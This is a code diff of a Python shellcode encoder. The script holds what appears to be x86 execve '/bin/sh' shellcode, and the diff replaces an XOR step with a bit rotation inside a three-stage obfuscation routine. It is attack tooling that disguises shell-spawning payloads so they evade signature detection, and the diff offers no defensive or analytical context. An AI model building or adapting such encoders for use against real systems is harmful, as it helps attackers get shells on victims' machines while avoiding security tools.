@@ -9,12 +9,16 @@ s = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x
 
 encoding = ""
 
+rol = lambda val, r_bits, max_bits: \
+    (val << r_bits%max_bits) & (2**max_bits-1) | \
+    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
+
 for x in bytearray(s) :
 	
 	# triple encoding 
 	
-	y = x^0xBB	# XOR with 0xBB
-        z = ~y		# complementing
+	y = rol(x,2,8)  # rotating twice to the left
+	z = ~y		# complementing
 	t = z+7	        # adding 7
 
 	encoding += '0x'
